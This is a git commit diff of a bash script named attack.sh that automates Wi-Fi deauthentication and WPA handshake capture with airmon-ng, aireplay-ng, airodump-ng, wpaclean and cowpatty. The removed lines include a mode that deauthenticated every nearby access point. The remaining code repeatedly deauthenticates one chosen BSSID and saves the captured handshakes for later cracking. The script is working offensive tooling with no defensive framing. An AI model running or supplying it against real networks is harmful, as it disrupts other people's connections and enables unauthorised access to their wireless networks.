03b2a699ad51d1a28ad1e14955ba5bca82dfe063
isa <58566654+rinamuka@users.noreply.github.com>
2022-03-28 13:36:05 +0000

    Update attack.sh

--- attack.sh
+++ attack.sh
@@ -1,136 +1,62 @@
-#!/bin/bash
 
 interface=""
 channel=""
 
-checkUtils(){
-        printf "Check utilities\n"
-        
-        #airmon-ng
-        output=$(airmon-ng)
-        if [[ "$output" == *"PHY"* ]]; then
-
-                printf "airmon-ng....\033[32m Done\033[0m\n"
-        else
-                printf "airmon-ng....\033[31mFail\033[0m\n"
-                exit 1
-        fi
-
-        #airodump-ng
-        output=$(airodump-ng)
-        if [[ "$output" == *"usage: airodump-ng"* ]]; then
-                printf "airodump-ng....\033[32m Done\033[0m\n"
-        else
-                printf "airodump-ng....\033[31m Fail\033[0m\n"
-                exit 1
-        fi
-
-
-        printf "\n"
-}
-
 checkHandshakes() {
-        #trap 'cleanup' EXIT
+        trap 'cleanup' EXIT
         printf "\n"
         echo "Check handshakes..."
         cleanout=$(wpaclean ./hscollector/cleancap.cap ./hscollector/shakes-01.cap)
-        echo $cleanout
         if [[ "$cleanout" == *"Net "* ]]; then
-                output=$(cap2hccapx ./hscollector/cleancap.cap ./hscollector/cleanshakes.hccapx)
-                echo $output
-                if [[ "$output" != *"Written 0"* ]]; then
+                output=$(cowpatty -c -r ./hscollector/cleancap.cap)
+                if [[ "$output" != *"Try using a
+different capture."* ]]; then
                         printf "\033[32mHandshakes detected!!!\033[0m\n"
                         time=$(date +%s)
                         filename="shake-$time"
                         if [[ -d ./hscollector/shakes ]]; then
-                                mv ./hscollector/cleanshakes.hccapx ./hscollector/shakes/shake-$time
+                                mv ./hscollector/cleancap.cap ./hscollector/shakes/handshake-$time
                         else
                                 mkdir ./hscollector/shakes
                                 chmod 777 -R ./hscollector/shakes
-                                mv ./hscollector/cleanshakes.hccapx ./hscollector/shakes/shake-$time
+                                mv ./hscollector/cleancap.cap ./hscollector/shakes/handshake-$time
                         fi
                         cleanup
                         exit 0
                  else
                         printf "\033[31mNo handshakes\033[0m\n"
-                        rm ./hscollector/cleanshakes.hccapx >/dev/null
+                        rm ./hscollector/cleancap.cap &>/dev/null
                  fi
         else 
                 printf "\033[31mNo handshakes\033[0m\n"
-                rm ./hscollector/cleanshakes.hccapx >/dev/null
+                rm ./hscollector/cleancap.cap &>/dev/null
         fi
-        rm cleancap.cap > /dev/null
+        rm cleancap.cap &> /dev/null
 }
 
 airodumpPID=""
-passive() {
-  trap 'cleanup;getparams' EXIT
-  airmon-ng start $interface >/dev/null
-  echo "Start airodump.."
-  timeout 60 airodump-ng -w ./hscollector/shakes $interface </dev/null >/dev/null
-  checkHandshakes
-  rm ./hscollector/shakes-* > /dev/null
-  passive
-}
-
-active() {
-  trap 'cleanup;' EXIT
-  echo "Collect APs..."
-  timeout 10 airodump-ng -w ./hscollector/shakesCollector $interface </dev/null >/dev/null 
-  while IFS=";" read -r id NetType ESSID BSSID Info Channel Cloaked Encryption Decrypted MaxRate MaxSeenRate Beacon LLC Data Crypt Weak Total Carrier Encoding FirstTime LastTime BestQuality BestSignal; do        
-          if [[ $BSSID == "BSSID" ]];then
-                  continue
-          fi
-          if [[ $id == "" ]]
-          then
-                  continue
-          fi
-          if [[ $BestQuality -lt -70 ]] || [[ $BestQuality -eq -1 ]]
-          then
-                  continue
-          fi
-            
-          printf "Attack: $BSSID \nChannel: $Channel \nPower: $BestQuality\nSSID: $ESSID\n"
-          iwconfig $interface channel $Channel
-          aireplay-ng -a $BSSID -0 10 $interface &
-          airodump-ng --bssid $BSSID --channel $Channel -w ./hscollector/shakes $interface >/dev/null 2>&1 </dev/null &
-          airodumpPID=`echo $!`
-          sleep 30
-          kill -9 $airodumpPID
-          checkHandshakes
-          rm ./hscollector/shakes-01.* >/dev/null
-  done < <(tac ./hscollector/shakesCollector-01.kismet.csv)
-  rm ./hscollector/shakes* &>/dev/null
-  
-}
-
 attackSpecific(){
-           trap 'cleanup;' EXIT
+           #trap 'cleanup;' EXIT
            airmon-ng start $interface >/dev/null
            BSSID_SEARCH=$1
            CHANNEL=$2
-           echo "CHannel:" $CHANNEL "BSSID:" $BSSID_SEARCH
-          iwconfig $interface channel $CHANNEL
-          aireplay-ng -a $BSSID_SEARCH -0 10 $interface &
-          airodump-ng --bssid $BSSID_SEARCH --channel $CHANNEL -w ./hscollector/shakes $interface 1>/dev/null 2>/dev/null 3>/dev/null &
-          airodumpPID=`echo $!`
-          sleep 30
-          echo "airodumpPID:"$airodumpPID
-          kill -9 $airodumpPID
-          checkHandshakes
+           iwconfig $interface channel $CHANNEL
+           aireplay-ng -a $BSSID_SEARCH -0 10 $interface &
+           airodump-ng --output-format pcap --bssid $BSSID_SEARCH --channel $CHANNEL -w ./hscollector/shakes $interface 1>/dev/null 2>/dev/null 3>/dev/null &
+           airodumpPID=`echo $!`
+           sleep 30
+           kill -9 $airodumpPID &> /dev/null
+           checkHandshakes
+           cleanup
 
-            cleanup
-            #rm ./hscollector/shakesCollector* &>/dev/null
-            #rm ./hscollector/shakes* &>/dev/null
-            attackSpecific $1
+           attackSpecific $1 $2
 }
 
 cleanup(){
-        kill -9 $airodumpPID
-        rm cleancap.cap
+        kill -9 $airodumpPID &> /dev/null
 
+        rm ./hscollector/cleancap.cap &>/dev/null
         rm ./hscollector/shakes* &> /dev/null
-        rm ./hscollector/cleanshakes.hccapx &> /dev/null
 }
 
 #trap 'cleanup;exit 0' SIGINT SIGTERM ERR EXIT
@@ -140,19 +66,10 @@ if [[ "$(whoami)" != root ]]; then
   exit 1
 fi
 
-main(){
-        checkUtils
-        mkdir -p hscollector
-        cleanup
-}
-
-
-
 
 if [[ $1 != "" ]] && [[ $2 != "" ]];then
                 interface=$1
-                checkUtils
-                mkdir -p hscollector
+                mkdir -p hscollector &> /dev/null
                 cleanup
                 airmon-ng start $interface >/dev/null
 
@@ -175,9 +92,7 @@ if [[ $1 != "" ]] && [[ $2 != "" ]];then
                                 exit 1
                         fi
 
-                        echo "BSSID:" $3 " Channel: "$channel
                         attackSpecific $3 $4 
                 fi
                 exit 0
 fi
-main 
